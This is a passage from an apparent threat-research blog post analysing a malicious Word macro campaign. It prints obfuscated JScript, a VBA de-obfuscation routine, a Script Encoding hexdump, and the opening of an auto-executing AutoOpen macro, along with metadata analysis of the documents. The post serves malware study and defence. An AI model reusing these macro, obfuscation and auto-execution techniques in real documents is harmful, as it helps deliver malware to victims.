class="crayon-sy">,</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->
<p>Figure 7: Obfuscated JScript code</p>
<p>In one of the earlier versions, towards the end of October and as shown by the fourth item in the Figure 5 timeline, an extra ASCII cipher obfuscation layer (excerpt in Figure 8) was added together with accompanying VBA code (Figure 9) to de-obfuscate said layer. This cipher obfuscation indicates the actors yearn to avoid detection.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a8aced983551089" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 6D6D@A072&amp;gt;@FDclVDJ&amp;gt;3@=Vj6D6D@A0w@H6G6CflV3C62&amp;lt;:?8Vj6D6D@A0A:==2CflV!2@=@Vj6D6D@A0AC6E6?5DlV{625:?8Vj6D6D@A04@&amp;gt;7@CE23=6lVBF2EEC@46?E@`Vj6D6D@A0!pq{~lV2CE:DE:4`_Vj6D6D@A0#2A926=flVsFC6CdVj6D6D@A0!:42DD@lV56&amp;gt;@?DEC2E6DVj6D6D@A04=62C=JdlV36EH66?Vj6D6D@A0%"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a8aced983551089-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a8aced983551089-1"><span class="crayon-h"> </span><span class="crayon-cn">6D6D</span><span class="crayon-sy">@</span><span class="crayon-v">A072</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-sy">@</span><span class="crayon-v">FDclVDJ</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-cn">3</span><span class="crayon-sy">@</span><span class="crayon-o">=</span><span class="crayon-v">Vj6D6D</span><span class="crayon-sy">@</span><span class="crayon-v">A0w</span><span class="crayon-sy">@</span><span class="crayon-v">H6G6CflV3C62</span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-o">:</span><span class="crayon-sy">?</span><span class="crayon-cn">8Vj6D6D</span><span class="crayon-sy">@</span><span class="crayon-v">A0A</span><span class="crayon-o">:</span><span class="crayon-o">==</span><span class="crayon-cn">2CflV</span><span class="crayon-o">!</span><span class="crayon-cn">2</span><span class="crayon-sy">@</span><span class="crayon-o">=</span><span class="crayon-sy">@</span><span class="crayon-e">Vj6D6D</span><span class="crayon-sy">@</span><span class="crayon-e">A0AC6E6</span><span class="crayon-sy">?</span><span class="crayon-cn">5DlV</span><span class="crayon-sy">{</span><span class="crayon-cn">625</span><span class="crayon-o">:</span><span class="crayon-sy">?</span><span class="crayon-cn">8Vj6D6D</span><span class="crayon-sy">@</span><span class="crayon-v">A04</span><span class="crayon-sy">@</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-cn">7</span><span class="crayon-sy">@</span><span class="crayon-v">CE23</span><span class="crayon-o">=</span><span class="crayon-cn">6lVBF2EEC</span><span class="crayon-sy">@</span><span class="crayon-cn">46</span><span class="crayon-sy">?</span><span class="crayon-e">E</span><span class="crayon-sy">@</span><span class="crayon-sy">`</span><span class="crayon-e">Vj6D6D</span><span class="crayon-sy">@</span><span class="crayon-e">A0</span><span class="crayon-o">!</span><span class="crayon-e">pq</span><span class="crayon-sy">{</span><span class="crayon-o">~</span><span class="crayon-v">lV2CE</span><span class="crayon-o">:</span><span class="crayon-v">DE</span><span class="crayon-o">:</span><span class="crayon-cn">4</span><span class="crayon-sy">`</span><span class="crayon-v">_Vj6D6D</span><span class="crayon-sy">@</span><span class="crayon-v">A0</span><span class="crayon-p">#2A926=flVsFC6CdVj6D6D@A0!:42DD@lV56&amp;gt;@?DEC2E6DVj6D6D@A04=62C=JdlV36EH66?Vj6D6D@A0%"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>Figure 8: Extra layer of obfuscated JScript code</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a8acf0661280755" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 Function Ghost(str)
    Dim i, j, k, r
    j = Len(str)
    r = ""
    For i = 1 To j
        k = Asc(Mid(str, i, 1))
        If k &amp;gt;= 33 And k &amp;lt;= 126 Then
            r = r &amp;amp; Chr(33 + ((k + 14) Mod 94))
        Else
            r = r &amp;amp; Chr(k)
        End If
    Next
    Ghost = r
End Function</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a8acf0661280755-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf0661280755-2">2</div><div class="crayon-num" data-line="crayon-5f69287a8acf0661280755-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf0661280755-4">4</div><div class="crayon-num" data-line="crayon-5f69287a8acf0661280755-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf0661280755-6">6</div><div class="crayon-num" data-line="crayon-5f69287a8acf0661280755-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf0661280755-8">8</div><div class="crayon-num" data-line="crayon-5f69287a8acf0661280755-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf0661280755-10">10</div><div class="crayon-num" data-line="crayon-5f69287a8acf0661280755-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf0661280755-12">12</div><div class="crayon-num" data-line="crayon-5f69287a8acf0661280755-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf0661280755-14">14</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a8acf0661280755-1"><span class="crayon-h"> </span><span class="crayon-t">Function</span><span class="crayon-h"> </span><span class="crayon-e">Ghost</span><span class="crayon-sy">(</span><span class="crayon-v">str</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf0661280755-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">Dim</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">j</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">k</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">r</span></div><div class="crayon-line" id="crayon-5f69287a8acf0661280755-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">j</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Len</span><span class="crayon-sy">(</span><span class="crayon-v">str</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf0661280755-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line" id="crayon-5f69287a8acf0661280755-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">For</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-st">To</span><span class="crayon-h"> </span><span class="crayon-i">j</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf0661280755-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">k</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Asc</span><span class="crayon-sy">(</span><span class="crayon-e">Mid</span><span class="crayon-sy">(</span><span class="crayon-v">str</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287a8acf0661280755-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">If</span><span class="crayon-h"> </span><span class="crayon-v">k</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">33</span><span class="crayon-h"> </span><span class="crayon-st">And</span><span class="crayon-h"> </span><span class="crayon-v">k</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">126</span><span class="crayon-h"> </span><span class="crayon-st">Then</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf0661280755-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">Chr</span><span class="crayon-sy">(</span><span class="crayon-cn">33</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">k</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">14</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Mod</span><span class="crayon-h"> </span><span class="crayon-cn">94</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287a8acf0661280755-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">Else</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf0661280755-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">Chr</span><span class="crayon-sy">(</span><span class="crayon-v">k</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287a8acf0661280755-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-st">If</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf0661280755-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">Next</span></div><div class="crayon-line" id="crayon-5f69287a8acf0661280755-13"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Ghost</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">r</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf0661280755-14"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-t">Function</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>Figure 9: VBA de-obfuscation code for extra layer of JScript obfuscation</p>
<p>It took a while for the actors to update any obfuscation techniques for the JScript code but around the middle of December, versions started to make use of Microsoft Script Encoding replacing their custom ASCII cipher perhaps for simplicity or bugs they themselves were finding difficult to debug.</p>
<p>Such encoded content often resides in files with a .JSE extension but its prudent to confirm by checking the magic bytes <strong>#@~^</strong> are present at the start of the file, an example of which is shown below:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a8acf2865969335" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 $ hexdump -C wx64.jse | head
00000000  23 40 7e 5e 4c 58 51 42  41 41 3d 3d 64 5e 57 4f  |#@~^LXQBAA==d^WO|
00000010  7f 5c 7f 44 43 6d 5c 7f  2b 2a 7b 20 31 26 70 2f  |.\.DCm\.+*{ 1&amp;amp;p/|</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a8acf2865969335-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf2865969335-2">2</div><div class="crayon-num" data-line="crayon-5f69287a8acf2865969335-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a8acf2865969335-1"><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-v">hexdump</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">C</span><span class="crayon-h"> </span><span class="crayon-v">wx64</span><span class="crayon-sy">.</span><span class="crayon-v">jse</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-i">head</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf2865969335-2"><span class="crayon-cn">00000000</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">23</span><span class="crayon-h"> </span><span class="crayon-cn">40</span><span class="crayon-h"> </span><span class="crayon-cn">7e</span><span class="crayon-h"> </span><span class="crayon-cn">5e</span><span class="crayon-h"> </span><span class="crayon-cn">4c</span><span class="crayon-h"> </span><span class="crayon-cn">58</span><span class="crayon-h"> </span><span class="crayon-cn">51</span><span class="crayon-h"> </span><span class="crayon-cn">42</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">41</span><span class="crayon-h"> </span><span class="crayon-cn">41</span><span class="crayon-h"> </span><span class="crayon-cn">3d</span><span class="crayon-h"> </span><span class="crayon-cn">3d</span><span class="crayon-h"> </span><span class="crayon-cn">64</span><span class="crayon-h"> </span><span class="crayon-cn">5e</span><span class="crayon-h"> </span><span class="crayon-cn">57</span><span class="crayon-h"> </span><span class="crayon-cn">4f</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-p">#@~^LXQBAA==d^WO|</span></div><div class="crayon-line" id="crayon-5f69287a8acf2865969335-3"><span class="crayon-cn">00000010</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">7f</span><span class="crayon-h"> </span><span class="crayon-cn">5c</span><span class="crayon-h"> </span><span class="crayon-cn">7f</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-h"> </span><span class="crayon-cn">43</span><span class="crayon-h"> </span><span class="crayon-cn">6d</span><span class="crayon-h"> </span><span class="crayon-cn">5c</span><span class="crayon-h"> </span><span class="crayon-cn">7f</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">2b</span><span class="crayon-h"> </span><span class="crayon-cn">2a</span><span class="crayon-h"> </span><span class="crayon-cn">7b</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-cn">31</span><span class="crayon-h"> </span><span class="crayon-cn">26</span><span class="crayon-h"> </span><span class="crayon-cn">70</span><span class="crayon-h"> </span><span class="crayon-cn">2f</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-sy">\</span><span class="crayon-sy">.</span><span class="crayon-v">DCm</span><span class="crayon-sy">\</span><span class="crayon-sy">.</span><span class="crayon-o">+</span><span class="crayon-o">*</span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-v">p</span><span class="crayon-o">/</span><span class="crayon-o">|</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>Figure 10: Use of Microsofts Script Encoding to further obfuscate the JScript code</p>
<p><strong><span lang="EN-GB">Dont judge a document by its cover</span></strong></p>
<p>Its often interesting to extract document meta-data and other information from such weaponized documents in case it provides insight into the investigation. Of course, much of this data could be forged (as <a href="https://blog.kaspersky.co.uk/office-documents-metadata/8494/">other researchers have shown</a>) or simply nonsensical. In this case, theres plenty of interesting variable data and information that make some conclusions quite plausible.</p>
<p>Looking at the charts below its clear to see patterns emerging in how the threat actors development of malware used in the campaign has evolved and how its analogous to a software development team working on a new project, tweaking code over time with some versions being major releases and others being minor.</p>
<p>Plotting the number of revisions made to each of the weaponized documents, as shown in Figure 11, and overlaying the number of words in each documents body, highlights some patterns beginning to emerge.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_7.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29987" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_7.png" alt="nemucod_7" width="975" height="280" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_7.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_7-900x258.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_7-300x86.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_7-768x221.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_7-370x106.png 370w" sizes="(max-width: 975px) 100vw, 975px" /></a></p>
<p>Figure 11: Chart plotting number of revisions (right-axis) to each document and the number of words contained (left-axis).</p>
<p>The properties of the weaponized document of the initial version from late October indicates a large number of revisions  the highest with 192  compared to all other versions since, which makes sense if it is indeed the actors first version indicating the authoring effort was significant with many modifications made. Again, this is analogous to a software developers first version of a piece of software.</p>
<p>Most of the versions avoided using anything but default VBA project property details, such as Project Names and Project Descriptions, however initially I didnt think this would be the case having analysed the first version. Figure 12 below shows the custom Project Description used in this version.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_8.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-29963" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_8.png" alt="nemucod_8" width="334" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_8.png 594w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_8-300x269.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_8-370x332.png 370w" sizes="(max-width: 334px) 100vw, 334px" /></a></p>
<p>Figure 12: VBA project description used in the first version.</p>
<p>If you dont recognise this quote, Figure 13 below should provide some more context.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_9.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-29939" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_9.png" alt="nemucod_9" width="532" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_9.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_9-900x508.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_9-300x169.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_9-768x433.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_9-370x209.png 370w" sizes="(max-width: 532px) 100vw, 532px" /></a></p>
<p>Figure 13: Breaking Bad season one, episode seven.</p>
<p>The quote used as the project description in the first version was a word for word copy from a scene in episode seven, season one of the American crime drama television series Breaking Bad. Warning  spoiler alert. I find it very fitting the threat actors should include this reference in their malware because, just as with the plot of the television series where a character was not always a criminal but turned to such a lifestyle to support his family, the person or persons behind this malware campaign must have switched at some point from law abiding to being cyber criminals.</p>
<p>Other document versions, much like the first with its 192 revisions as previously mentioned, also have an above-average number of revisions that tie to significant updates and feature releases in the malwares evolution akin to a major software release. I will discuss these in more detail shortly but before moving on its worth highlighting the significance of the flat-line (zero) for the number of words included in these document versions that suddenly jumps up to over 6,000 words on the 30<sup>th</sup> November 2016 and that continues to trend upwards eventually ending with some of the most recent versions having over three times the number of words. Over this time period, as the number of words in each document increased, during this time the obfuscation techniques remained fairly stagnant indicating that the amount of code was increasing as more capabilities were added over time.</p>
<p>In addition to the number of words and edit revisions of these weaponized documents, comparing the time spent editing them compounds the aforementioned patterns in the evolution. Figure 14 shows a couple of interesting points to note. Firstly, that the initial version took the most amount of editing thus far  over 2 days  and secondly, that the next highest amount of time spent was on the November 30<sup>th</sup> coinciding with the aforementioned spike in number of words from zero to over 6,000.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_10.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29915" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_10.png" alt="nemucod_10" width="975" height="279" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_10.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_10-900x258.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_10-300x86.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_10-768x220.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_10-370x106.png 370w" sizes="(max-width: 975px) 100vw, 975px" /></a></p>
<p>Figure 14: Chart plotting amount of editing time for each version.</p>
<p>November 30<sup>th</sup> was certainly a significant shift in the techniques used by the actors and, investigating further, the change made by the actors between the two dates was to move the encoded JScript code from being statically held within the VBA code to being stored in the Word document itself.</p>
<p><strong><span lang="EN-GB">How much VBA is too much?</span></strong></p>
<p>Pre-November 30<sup>th</sup> all versions seen had the obfuscated (but not yet encoded at this point) JScript code stored in the malicious VBA code within Words AutoOpen macro, such that the code will execute automatically when the document is opened by the victim. The excerpt in Figure 15 provides a glimpse of said code but is truncated by many 100s of lines. Highlighted in bold is the code to add chunks of the obfuscated JScript code into an array object that will later be enumerated, processed and reassembled for writing to disk as a single .JSE file for execution by the Microsoft Windows Script Host executable (wscript.exe). The VBA code is overcomplicated with various function and object names being broken up unnecessarily and stitched together at run-time to be syntactically correct, another effort to hinder human analysis.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a8acf7072397075" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 Sub AutoOpen()

'==========================================================================
Dim objSysInfo: Set objSysInfo = CreateObject("WinNTSystemInfo")
Dim objFSO:     Set objFSO = CreateObject("Scripting.FileSystemObject")
Dim objShell:   Set objShell = CreateObject("Shell.Application")
Dim objDic:     Set objDic = CreateObject("Scripting.Dictionary")
Dim objPO:      Set objPO = CreateObject("Scripting.Dictionary")
Dim wsh:        Set wsh = VBA.CreateObject("WScript.Shell")
'==========================================================================

Dim filepath As String:  filepath = Empty
Dim tempcode12 As String:  tempcode12 = Empty
Dim hash12 As String:  hash12 = Empty
Dim strComputerName As String:  strComputerName = Empty
Dim objFile, empty12, filets, ver, out1, proc
Dim hash#, upper&amp;amp;, i&amp;amp;
Dim now, mimi As Long
Const max# = 2 ^ 31


With objDic
